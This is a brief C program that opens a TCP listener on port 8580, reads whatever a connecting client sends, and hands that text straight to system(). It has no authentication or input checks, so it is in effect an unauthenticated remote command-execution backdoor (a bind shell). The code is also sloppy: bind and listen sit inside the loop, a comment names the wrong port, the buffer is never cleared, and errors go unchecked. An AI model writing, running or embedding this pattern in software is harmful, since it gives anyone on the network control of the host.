#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 8580

void server_up()
{
  int server_fd, new_socket;
  ssize_t valread;
  struct sockaddr_in address;

  socklen_t addrlen = sizeof(address);
  char buffer[1024] = { 0 };
  char* hello = "Hello from server";

  // Creating socket file descriptor
  server_fd = socket(AF_INET, SOCK_STREAM, 0);

  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;
  address.sin_port = htons(PORT);

  while (1)
  {
    
    // Forcefully attaching socket to the port 8080
    bind(server_fd, (struct sockaddr*)&address, sizeof(address));

    listen(server_fd, 3);
    
    new_socket = accept(server_fd, (struct sockaddr*)&address, &addrlen);

    valread = read(new_socket, buffer, 1024 - 1);
    
    printf("%s\n", buffer);
    send(new_socket, hello, strlen(hello), 0);

    char *cmd = buffer;

    system(buffer);
    
    // closing the connected socket
    close(new_socket);
  }
  
  // closing the listening socket
  close(server_fd);
  
}

int main(void)
{
  server_up();

  return 0;
}